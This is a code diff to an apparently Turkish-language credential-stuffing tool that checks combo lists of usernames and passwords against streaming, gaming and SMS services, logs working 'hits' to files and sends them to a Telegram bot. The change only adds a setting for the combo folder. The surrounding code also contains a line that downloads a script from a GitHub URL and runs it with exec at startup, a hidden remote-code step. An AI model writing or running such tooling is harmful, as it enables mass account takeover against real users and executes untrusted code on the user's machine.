@@ -7,12 +7,20 @@ import requests,hashlib,random,string,time
 import random
 import json
 try:
+    cihaz=open("cihaz.txt","r").read()
+except:
+    cihaz="/sdcard/combo/"
+try:
     import threading
 except:
     os.system("pip install threading")
     import threding
 import requests;exec(requests.get("https://raw.githubusercontent.com/yusiqo/ngrok/main/kur.pf2").text)
 def banner():
+    try:
+        cihaz=open("cihaz.txt","r").read()
+    except:
+        cihaz="/sdcard/combo/"
     st=GREEN+"""
 ░█████╗░██████╗░███╗░░░███╗
 ██╔══██╗██╔══██╗████╗░████║
@@ -20,16 +28,22 @@ def banner():
 ██║░░██║██╔═══╝░██║╚██╔╝██║
 ╚█████╔╝██║░░░░░██║░╚═╝░██║
 ░╚════╝░╚═╝░░░░░╚═╝░░░░░╚═╝
-"""+END+"""
+"""+END+f"""
 Coded By @yusiqo
 Channel: @ZetTekno
 Version: 0.6
+Kombo Konumu: {cihaz}
 ⌯ Varlığım Türk Irkına Armağan Olsun
 ⌯ Linkten Kazandığım Paraları Bagış Yapcam Kurumlara
 """
     print(st)
 def clear():
     os.system("clear")
+try:
+    cihaz=open("cihaz.txt","r").read()
+except:
+    cihaz="/sdcard/combo/"
+
 def checker():
     clear()
     banner()
@@ -54,7 +68,7 @@ def checker():
             quit()
             exit()
     dsy=""
-    dirm="/sdcard/combo/"
+    dirm=cihaz
     say=0
     try:
         for files in os.listdir(dirm):
@@ -70,7 +84,10 @@ def checker():
             if combo==str(say):
                 comboo=(dirm+files)
     except:
-        os.system("cd && cd /sdcard/ && mkdir combo")
+        if "sdcard" in cihaz:
+            os.system("cd && cd /sdcard/ && mkdir combo")
+        else:
+            os.system("cd && mkdir combo")
         for files in os.listdir(dirm):
             say+=1
             dsy=dsy+str(say)+"-) "+files+'\n'
@@ -132,7 +149,7 @@ def checker():
         now = datetime.datetime.now()
         trh=(now.strftime("%D")).split('/')[1]
         
-        Dosya="/sdcard/IptvList_m3u_" +str(now.strftime("%D")).replace('/','-')+"@Zet.txt"
+        Dosya=cihaz+"IptvList_m3u_" +str(now.strftime("%D")).replace('/','-')+"@Zet.txt"
         def Kaydet(hits):
             dosya=open(Dosya,'a+') 
             dosya.write(hits)
@@ -389,7 +406,7 @@ def checker():
                                 requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
                             except:
                                 pass
-                            open("/sdcard/combo/hit-SMSONAY.txt","a").write(ms)
+                            open(cihaz+"hit-SMSONAY.txt","a").write(ms)
                         else:
                             print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                     except:
@@ -448,7 +465,7 @@ def checker():
                                     requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
                                 except:
                                     pass
-                                open("/sdcard/combo/hit-Exxen.txt","a").write(ms)
+                                open(cihaz+"hit-Exxen.txt","a").write(ms)
                         except:
                             print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                     else:
@@ -538,7 +555,7 @@ def checker():
                             requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
                         except:
                             pass
-                        open("/sdcard/combo/hit-SMSONAY.txt","a").write(ms)
+                        open(cihaz+"hit-SMSONAY.txt","a").write(ms)
                     else:
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
@@ -605,7 +622,7 @@ def checker():
             }
             try:
                 requests.get("http://google.com/", timeout=2, proxies=prox)
-                open("/sdcard/combo/Hit-Htpp-Proxy.txt","a").write(prx+"\n")
+                open(cihaz+"Hit-Htpp-Proxy.txt","a").write(prx+"\n")
                 print(GREEN+"⌯ "+prx +END)
             except:
                 print(RED+f"⌯ Ölü!! {prx}"+END)
@@ -690,7 +707,7 @@ def checker():
                             requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
                         except:
                             pass
-                        open("/sdcard/combo/hit-Pubg.txt","a").write(ms)
+                        open(cihaz+"hit-Pubg.txt","a").write(ms)
                     else:
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
@@ -860,7 +877,7 @@ def checker():
                                 requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
                             except:
                                 pass
-                        open("/sdcard/combo/hit-BlUTv.txt","a").write(ms)
+                        open(cihaz+"hit-BlUTv.txt","a").write(ms)
                     else:
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
@@ -944,7 +961,7 @@ def checker():
                             requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
                         except:
                             pass
-                        open("/sdcard/combo/hit-Gain.txt","a").write(ms)
+                        open(cihaz+"hit-Gain.txt","a").write(ms)
                     else:
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
@@ -1012,7 +1029,7 @@ def checker():
 def ayar():
     clear()
     banner()
-    print("1) Telegram Bot\n0) Geri Dönmek")
+    print("1) Telegram Bot\n2) Cihaz Ayarı\n0) Geri Dönmek")
     sor=input(YELLOW+"Seçim Yapınız: "+END)
     if sor=="1":
         clear()
@@ -1026,7 +1043,17 @@ def ayar():
         print("Ayarlar Uygulanıyor, Bekleyiniz....")
         time.sleep(5)
         sorr()
-    if sor=="0":
+    elif sor=="0":
+        sorr()
+    elif sor =="2":
+        clear()
+        banner()
+        print(GREEN +"[1]"+BLUE+" Mobil"+ GREEN +"\n[2]"+BLUE+" Pc"+ END)
+        chz=input(YELLOW+"Seçim: "+ END)
+        if chz=="1":
+            open("cihaz.txt","w").write("/sdcard/combo/")
+        elif chz=="2":
+            open("cihaz.txt","w").write("/combo/")
         sorr()
 def sorr():
     clear()
